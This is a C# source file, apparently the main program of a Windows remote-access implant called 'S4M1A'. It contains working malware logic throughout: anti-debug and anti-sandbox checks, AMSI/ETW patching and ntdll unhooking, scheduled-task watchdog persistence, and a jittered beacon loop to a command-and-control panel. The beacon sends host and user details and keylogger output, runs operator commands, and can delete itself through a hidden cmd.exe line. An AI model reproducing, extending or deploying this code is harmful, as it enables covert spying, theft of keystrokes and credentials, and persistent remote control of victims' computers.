using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using S4M1A.Implant.Evasion;
using S4M1A.Implant.Modules;

namespace S4M1A.Implant
{
    // =====================================================================
    //  S4M1A Implant v2.0 - entry point and beacon loop
    //
    //  Flow:
    //    1. Load overlay config (disk execution only - see Config.cs)
    //    2. Single-instance mutex (prevents duplicate sessions)
    //    3. Evasion: anti-debug + anti-sandbox (fail closed)
    //    4. Unhook ntdll/amsi/winhttp, patch AMSI/ETW (best effort)
    //    5. ECDH handshake, then beacon loop with jitter
    //  Design notes (v2.0 fixes):
    //    - Environment.Exit(0) after update/exit - no duplicate sessions
    //    - per-session ECDH key - the old static MASTER key is gone
    //    - global kill switch checked by the panel (killme command)
    // =====================================================================

    public static class Program
    {
        private static Random _rnd = new Random();
        private static string _sessionId;
        private static int _beaconCount;
        private static int _failCount;

        [STAThread]
        public static void Main()
        {
            try
            {
                if (!Config.Load()) return; // silent exit - no valid config

                if (!AcquireMutex()) return; // another instance is running

                // ---------- evasion (fail closed) ----------
                if (AntiDebug.Detect() || AntiSandbox.Flagged())
                    return;

                // ---------- defense surface ----------
                try { Unhooker.UnhookAll(); } catch { }
                try { AmsiBypass.Apply(); } catch { }

                // ---------- builder option: install watchdog ----------
                // Revives a killed implant within WatchdogMinutes (scheduled
                // task, every 5 min) and after every logon/reboot. The mutex
                // above turns extra launches into instant no-ops.
                if (Config.Current.Startup)
                {
                    try
                    {
                        string exe =
                            System.Reflection.Assembly.GetExecutingAssembly().Location;
                        if (!string.IsNullOrEmpty(exe))
                            Persistence.Add(Config.Current.Id + "-watch",
                                            "watchdog", exe);
                    }
                    catch { }
                }

                // ---------- beacon loop ----------
                while (true)
                {
                    try
                    {
                        if (_sessionId == null)
                        {
                            if (!Reconnect()) { SleepNext(); continue; }
                        }

                        string payload = BuildPayload();
                        string reply = Network.Beacon(payload);

                        if (reply == null)
                        {
                            _failCount++;
                            if (_failCount >= 3)
                            {
                                _sessionId = null;
                                Network.Reset();
                                _failCount = 0;
                            }
                            SleepNext();
                            continue;
                        }

                        _failCount = 0;
                        _beaconCount++;

                        // periodic re-check (cheap)
                        if (_beaconCount % 600 == 0 && AntiDebug.Detect())
                            return;

                        HandleReply(reply);
                        SleepNext();
                    }
                    catch
                    {
                        SleepNext();
                    }
                }
            }
            catch
            {
                // never crash loudly
            }
            finally
            {
                try { Network.Reset(); } catch { }
            }
        }

        // ------------------------- session -------------------------

        private static bool Reconnect()
        {
            for (int i = 0; i < 3; i++)
            {
                if (Network.Handshake(out _sessionId))
                {
                    _failCount = 0;
                    return true;
                }
                Thread.Sleep(2000 * (i + 1));
            }
            return false;
        }

        private static void HandleReply(string reply)
        {
            string t = JsonUtil.Get(reply, "t");
            if (t != "cmd") return;

            string cid = JsonUtil.Get(reply, "cid");
            string cmd = JsonUtil.Get(reply, "cmd");
            string args = JsonUtil.Get(reply, "args");
            if (cmd == null) return;

            // global kill switch - password from the panel config
            if (cmd == "killsw")
            {
                if (args == Config.Current.Kill) KillSelf();
                return;
            }

            string result = Commands.Execute(cmd, args ?? "");

            string act = JsonUtil.Get(result, "act");
            switch (act)
            {
                case "sleep":
                    int ms;
                    if (int.TryParse(args, out ms) && ms >= 1000)
                        ChangeSleep(ms);
                    break;
                case "killme":
                    KillSelf();
                    return;
                case "uninstall":
                    UninstallSelf();
                    return;
                case "restart":
                    Network.Reset();
                    _sessionId = null;
                    return;
            }

            _pendingResult = result;
            _pendingCid = cid;
        }

        private static string _pendingResult = "";
        private static string _pendingCid = "";

        private static void ChangeSleep(int ms)
        {
            // persists only for this run; panel sends "sleep" at each
            // reconnect if it wants a permanent override.
            _currentSleep = ms;
        }

        private static int _currentSleep = -1;

        // ------------------------- payload -------------------------

        // beacon body: {"info":{...},"res":{"cid":...,"ok":...,"data":...},"klog":"<b64>"}
        // matches Panel C2Server.DoBeacon: info -> session, res -> result, klog -> log
        private static string BuildPayload()
        {
            StringBuilder sb = new StringBuilder();
            sb.Append("{\"info\":{")
              .Append("\"id\":\"").Append(JsonUtil.Escape(Config.Current.Id)).Append("\",")
              .Append("\"group\":\"").Append(JsonUtil.Escape(Config.Current.Group)).Append("\",")
              .Append("\"host\":\"").Append(JsonUtil.Escape(Environment.MachineName)).Append("\",")
              .Append("\"user\":\"").Append(JsonUtil.Escape(Environment.UserName)).Append("\",")
              .Append("\"os\":\"").Append(JsonUtil.Escape(Environment.OSVersion.VersionString)).Append("\",")
              .Append("\"arch\":\"").Append(IntPtr.Size == 8 ? "x64" : "x86").Append("\",")
              .Append("\"pid\":\"").Append(Process.GetCurrentProcess().Id.ToString()).Append("\",")
              .Append("\"ip\":\"").Append(JsonUtil.Escape(GetIp())).Append("\",")
              .Append("\"up\":\"").Append((Environment.TickCount / 1000).ToString()).Append("\"}");

            // pending command result (one per beacon); cid must ride inside
            // "res" so the panel can match it to the task (SubmitResult)
            if (!string.IsNullOrEmpty(_pendingResult))
            {
                sb.Append(",\"res\":").Append(AttachCid(_pendingResult, _pendingCid));
                _pendingResult = "";
                _pendingCid = "";
            }

            // keylogger pump
            string klog = Keylogger.Flush();
            if (!string.IsNullOrEmpty(klog))
                sb.Append(",\"klog\":\"").Append(klog).Append("\"");

            sb.Append("}");
            return sb.ToString();
        }

        // injects "cid" as the first member of a result JSON object, e.g.
        // {"ok":true,...} -> {"cid":"...","ok":true,...}
        private static string AttachCid(string resultJson, string cid)
        {
            if (string.IsNullOrEmpty(resultJson) || resultJson.Length < 2)
                return "{\"ok\":false,\"err\":\"empty result\",\"cid\":\""
                     + JsonUtil.Escape(cid ?? "") + "\"}";
            if (resultJson[0] != '{')
                return "{\"ok\":false,\"err\":\"bad result\",\"cid\":\""
                     + JsonUtil.Escape(cid ?? "") + "\"}";
            return "{\"cid\":\"" + JsonUtil.Escape(cid ?? "") + "\","
                 + resultJson.Substring(1);
        }

        private static string GetIp()
        {
            try
            {
                foreach (IPAddress a in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (a.AddressFamily == AddressFamily.InterNetwork)
                        return a.ToString();
                }
            }
            catch { }
            return "0.0.0.0";
        }

        // ------------------------- sleep -------------------------

        private static void SleepNext()
        {
            int baseMs = _currentSleep > 0 ? _currentSleep : Config.Current.SleepMs;
            int jitter = Config.Current.JitterPct;
            if (jitter > 0)
            {
                int delta = (int)((long)baseMs * jitter / 100);
                baseMs = Math.Max(1000, baseMs + _rnd.Next(-delta, delta + 1));
            }
            SleepMask.SleepProtected(baseMs);
        }

        // ------------------------- lifecycle -------------------------

        private static bool AcquireMutex()
        {
            string name = "S4M1A-" + Config.Current.Id +
                          "-" + (IntPtr.Size == 8 ? "x64" : "x86");
            bool created;
            try
            {
                _mutex = new Mutex(true, name, out created);
            }
            catch
            {
                created = false;
            }
            if (!created)
            {
                if (_mutex != null) _mutex.Close();
                return false;
            }
            return true;
        }

        private static Mutex _mutex;

        private static void KillSelf()
        {
            try { Persistence.RemoveAll(); } catch { }
            Environment.Exit(0);
        }

        private static void UninstallSelf()
        {
            try { Persistence.RemoveAll(); } catch { }
            string exe = System.Reflection.Assembly.GetExecutingAssembly().Location;
            if (!string.IsNullOrEmpty(exe))
            {
                // self-delete shortly after exit (process must be gone first)
                string cmd = "/c ping 127.0.0.1 -n 3 >nul & del /f /q \"" + exe + "\"";
                try
                {
                    Process.Start(new ProcessStartInfo("cmd.exe", cmd)
                    {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true
                    });
                }
                catch { }
            }
            Environment.Exit(0);
        }
    }
}